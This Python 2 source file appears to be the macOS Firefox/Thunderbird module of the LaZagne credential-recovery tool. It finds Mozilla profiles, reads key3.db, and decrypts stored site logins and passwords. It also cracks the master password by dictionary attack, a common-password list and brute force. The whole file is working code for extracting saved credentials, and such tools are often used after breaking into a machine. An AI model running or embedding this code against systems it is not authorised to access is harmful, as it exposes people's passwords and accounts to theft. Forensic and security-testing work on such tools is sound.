#!/usr/bin/env python
# Required files (key3.db, signongs.sqlite, cert8.db)
# Inspired from https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py

from ctypes import *
import sys, os, re, glob
from base64 import b64decode
from ConfigParser import RawConfigParser
import sqlite3
import json
import shutil
from lazagne.config.dico import get_dico
from itertools import product
# https://pypi.python.org/pypi/pyasn1/
from pyasn1.codec.der import decoder
from struct import unpack
from binascii import hexlify, unhexlify
from hashlib import sha1
import hmac
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import DES3
from lazagne.config.constant import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo

# Database classes
database_find = False


class Credentials(object):
    def __init__(self, db):
        global database_find
        self.db = db
        if os.path.isfile(db):
            # check if the database is not empty
            f = open(db, 'r')
            tmp = f.read()
            if tmp:
                database_find = True
            f.close()

    def __iter__(self):
        pass

    def done(self):
        pass


class JsonDatabase(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, u"logins.json")
        super(JsonDatabase, self).__init__(db)

    def __iter__(self):
        if os.path.exists(self.db):
            with open(self.db) as fh:
                data = json.load(fh)
                try:
                    logins = data["logins"]
                except:
                    raise Exception(
                        "Unrecognized format in {0}".format(self.db))

                for i in logins:
                    yield (i["hostname"], i["encryptedUsername"],
                           i["encryptedPassword"])


class SqliteDatabase(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "signons.sqlite")
        super(SqliteDatabase, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute(
            "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
        for i in self.c:
            yield i

    def done(self):
        super(SqliteDatabase, self).done()
        self.c.close()
        self.conn.close()


class Mozilla(ModuleInfo):
    # b = brute force attack
    # m = manually
    # d = default list
    # a = dictionary attack

    def __init__(self, isThunderbird=False):

        self.credentials_categorie = None

        self.toCheck = []
        self.manually_pass = None
        self.dictionary_path = None
        self.number_toStop = None

        self.key3 = ''

        # Manage options
        suboptions = [
                        {'command': '-m', 'action': 'store', 'dest': 'manually', 'help': 'enter the master password manually', 'title': 'Advanced Mozilla master password options'},
                        {'command': '-s', 'action': 'store', 'dest': 'specific_path', 'help': 'enter the specific path to a profile you want to crack', 'title': 'Advanced Mozilla master password options'}
                    ]

        if not isThunderbird:
            options = {'command': '-firefox', 'action': 'store_true', 'dest': 'firefox', 'help': 'firefox'}
            ModuleInfo.__init__(self, 'firefox', 'browsers', options, suboptions)
        else:
            options = {'command': '-thunderbird', 'action': 'store_true', 'dest': 'thunderbird', 'help': 'thunderbird'}
            ModuleInfo.__init__(self, 'thunderbird', 'browsers', options, suboptions)

    def get_path(self, software_name):
        path = u''
        if software_name == u'Firefox':
            path = os.path.expanduser(u"~/Library/Application Support/Firefox/")
        elif software_name == u'Thunderbird':
            path = os.path.expanduser(u"~/Library/Thunderbird")
        return path

    def manage_advanced_options(self):
        if constant.manually:
            self.manually_pass = constant.manually
            self.toCheck.append('m')

        if constant.path:
            self.dictionary_path = constant.path
            self.toCheck.append('a')

        if constant.bruteforce:
            self.number_toStop = int(constant.bruteforce) + 1
            self.toCheck.append('b')

        # default attack
        if self.toCheck == []:
            self.toCheck = ['b', 'd']
            self.number_toStop = 3

    # --------------------------------------------

    def getShortLE(self, d, a):
        return unpack('<H', (d)[a:a + 2])[0]

    def getLongBE(self, d, a):
        return unpack('>L', (d)[a:a + 4])[0]

    def printASN1(self, d, l, rl):
        type = ord(d[0])
        length = ord(d[1])
        if length & 0x80 > 0:  # http://luca.ntop.org/Teaching/Appunti/asn1.html,
            nByteLength = length & 0x7f
            length = ord(d[2])
            # Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets.
            skip = 1
        else:
            skip = 0

        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2 + skip + readLen:], seqLen, rl + 1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length + 2
        elif type == 6:  # OID
            return length + 2
        elif type == 4:  # OCTETSTRING
            return length + 2
        elif type == 5:  # NULL
            # print 0
            return length + 2
        elif type == 2:  # INTEGER
            return length + 2
        else:
            if length == l - 2:
                self.printASN1(d[2:], length, rl + 1)
                return length

            # extract records from a BSD DB 1.85, hash mode

    def readBsddb(self, name):
        f = open(name, 'rb')

        # http://download.oracle.com/berkeley-db/db.1.85.tar.gz
        header = f.read(4 * 15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            print_debug('WARNING', 'Bad magic number')
            return False
        version = self.getLongBE(header, 4)
        if version != 2:
            print_debug('WARNING', 'Bad version !=2 (1.85)')
            return False
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize * page)
            offsets = f.read((nkeys + 1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2 + i)
                val = self.getShortLE(offsets, 4 + i)
                nval = self.getShortLE(offsets, 8 + i)
                offsetVals.append(key + pagesize * page)
                offsetVals.append(val + pagesize * page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize * (page + 1))
            valKey = sorted(offsetVals)
            for i in range(keys * 2):
                f.seek(valKey[i])
                data = f.read(valKey[i + 1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i + 1]] = db1[i]

        return db

    def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData):
        # see http://www.drh-consultancy.demon.co.uk/key3.html
        hp = sha1(globalSalt + masterPassword).digest()
        pes = entrySalt + '\x00' * (20 - len(entrySalt))
        chp = sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]

        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def extractSecretKey(self, globalSalt, masterPassword, entrySalt):

        (
        globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(
            masterPassword)

        if unhexlify('f8000000000000000000000000000001') not in self.key3:
            return None
        privKeyEntry = self.key3[unhexlify('f8000000000000000000000000000001')]
        saltLen = ord(privKeyEntry[1])
        nameLen = ord(privKeyEntry[2])
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
        data = privKeyEntry[3 + saltLen + nameLen:]
        self.printASN1(data, len(data), 0)

        # see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decrypt3DES(globalSalt, masterPassword, entrySalt,
                                   privKeyData)
        self.printASN1(privKey, len(privKey), 0)

        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])

        print_debug('DEBUG', 'key: %s' % repr(key))
        return key

    # --------------------------------------------

    # Get the path list of the firefox profiles
    def get_firefox_profiles(self, directory):
        cp = RawConfigParser()
        try:
            cp.read(os.path.join(directory, u'profiles.ini'))
        except:
            return []

        profile_list = []
        for section in cp.sections():
            if section.startswith('Profile'):
                if cp.has_option(section, 'Path'):
                    profile_list.append(os.path.join(directory, cp.get(section,
                                                                       'Path').strip()))
        return profile_list

    # ------------------------------ Master Password Functions ------------------------------

    def is_masterpassword_correct(self, masterPassword=''):
        try:
            # see http://www.drh-consultancy.demon.co.uk/key3.html
            pwdCheck = self.key3['password-check']
            entrySaltLen = ord(pwdCheck[1])
            entrySalt = pwdCheck[3: 3 + entrySaltLen]
            encryptedPasswd = pwdCheck[-16:]
            globalSalt = self.key3['global-salt']
            cleartextData = self.decrypt3DES(globalSalt, masterPassword,
                                             entrySalt, encryptedPasswd)
            if cleartextData != 'password-check\x02\x02':
                return ('', '', '')

            return (globalSalt, masterPassword, entrySalt)
        except:
            return ('', '', '')

    # Retrieve masterpassword
    def found_masterpassword(self):

        # master password entered manually
        if 'm' in self.toCheck:
            print_debug('ATTACK', 'Check the password entered manually !')
            if self.is_masterpassword_correct(self.manually_pass)[0]:
                print_debug('FIND',
                            'Master password found: %s' % self.manually_pass)
                return self.manually_pass
            else:
                print_debug('WARNING',
                            'The Master password entered is not correct')

        # dictionary attack
        if 'a' in self.toCheck:
            try:
                pass_file = open(self.dictionary_path, 'r')
                num_lines = sum(1 for line in pass_file)
            except:
                print_debug('ERROR', 'Unable to open passwords file: %s' % str(
                    self.dictionary_path))
                return False
            pass_file.close()

            print_debug('ATTACK',
                        'Dictionary Attack !!! (%s words)' % str(num_lines))
            try:
                with open(self.dictionary_path) as f:
                    for p in f:
                        if self.is_masterpassword_correct(p.strip())[0]:
                            print_debug('FIND',
                                        'Master password found: %s' % p.strip())
                            return p.strip()

            except (KeyboardInterrupt, SystemExit):
                print 'INTERRUPTED!'
                print_debug('DEBUG', 'Dictionary attack interrupted')
            except Exception, e:
                print_debug('DEBUG', '{0}'.format(e))

            print_debug('WARNING',
                        'The Master password has not been found using the dictionary attack')

        # 500 most used passwords
        if 'd' in self.toCheck:
            wordlist = get_dico() + constant.passwordFound
            num_lines = (len(wordlist) - 1)
            print_debug('ATTACK', '%d most used passwords !!! ' % num_lines)

            for word in wordlist:
                if self.is_masterpassword_correct(word)[0]:
                    print_debug('FIND',
                                'Master password found: %s' % word.strip())
                    return word

            print_debug('WARNING',
                        'No password has been found using the default list')

        # brute force attack
        if 'b' in self.toCheck or constant.bruteforce:
            charset_list = 'abcdefghijklmnopqrstuvwxyz1234567890!?'
            print_debug('ATTACK',
                        'Brute force attack !!! (%s characters)' % str(
                            constant.bruteforce))
            print_debug('DEBUG', 'charset: %s' % charset_list)

            try:
                for length in range(1, int(self.number_toStop)):
                    words = product(charset_list, repeat=length)
                    for word in words:
                        print_debug('DEBUG', '%s' % ''.join(word))
                        if self.is_masterpassword_correct(''.join(word))[0]:
                            w = ''.join(word)
                            print_debug('FIND',
                                        'Master password found: %s' % w.strip())
                            return w.strip()
            except (KeyboardInterrupt, SystemExit):
                print 'INTERRUPTED!'
                print_debug('INFO', 'Dictionary attack interrupted')
            except Exception, e:
                print_debug('DEBUG', '{0}'.format(e))

            print_debug('WARNING',
                        'No password has been found using the brute force attack')
        return False

    # ------------------------------ End of Master Password Functions ------------------------------

    # main function
    def run(self, software_name=None):
        global database_find
        database_find = False

        self.manage_advanced_options()

        if constant.mozilla_software:
            software_name = constant.mozilla_software
        specific_path = constant.specific_path

        # get the installation path
        path = self.get_path(software_name)
        if not path:
            print_debug('WARNING', 'Installation path not found')
            return

        # Check if mozilla folder has been found
        elif not os.path.exists(path):
            print_debug('INFO', software_name + ' not installed.')
            return
        else:
            if specific_path:
                if os.path.exists(specific_path):
                    profile_list = [specific_path]
                else:
                    print_debug('WARNING',
                                'The following file does not exist: %s' % specific_path)
                    return
            else:
                profile_list = self.get_firefox_profiles(path)

            pwdFound = []
            for profile in profile_list:
                print_debug('INFO', 'Profile path found: %s' % profile)
                if not os.path.exists(profile + os.sep + 'key3.db'):
                    print_debug('WARNING',
                                'key3 file not found: %s' % self.key3)
                    continue

                self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
                if not self.key3:
                    continue

                # check if passwords are stored on the Json format
                try:
                    credentials = JsonDatabase(profile)
                except:
                    database_find = False

                if not database_find:
                    # check if passwords are stored on the sqlite format
                    try:
                        credentials = SqliteDatabase(profile)
                    except:
                        database_find = False

                if database_find:
                    masterPassword = ''
                    (globalSalt, masterPassword,
                     entrySalt) = self.is_masterpassword_correct(masterPassword)

                    # find masterpassword if set
                    if not globalSalt:
                        print_debug('WARNING', 'Master Password is used !')
                        masterPassword = self.found_masterpassword()
                        if not masterPassword:
                            continue

                    # get user secret key
                    key = self.extractSecretKey(globalSalt, masterPassword,
                                                entrySalt)
                    if not key:
                        continue

                    # everything is ready to decrypt password
                    for host, user, passw in credentials:
                        values = {}
                        values["URL"] = host

                        # Login
                        loginASN1 = decoder.decode(b64decode(user))
                        iv = loginASN1[0][1][1].asOctets()
                        ciphertext = loginASN1[0][2].asOctets()
                        login = DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext)
                        # remove bad character at the end
                        try:
                            nb = unpack('B', login[-1])[0]
                            values["Login"] = unicode(login[:-nb])
                        except:
                            values["Login"] = unicode(login)

                        # Password
                        passwdASN1 = decoder.decode(b64decode(passw))
                        iv = passwdASN1[0][1][1].asOctets()
                        ciphertext = passwdASN1[0][2].asOctets()
                        password = DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext)
                        # remove bad character at the end
                        try:
                            nb = unpack('B', password[-1])[0]
                            values["Password"] = unicode(password[:-nb])
                        except:
                            values["Password"] = unicode(password)

                        if len(values):
                            pwdFound.append(values)

            return pwdFound
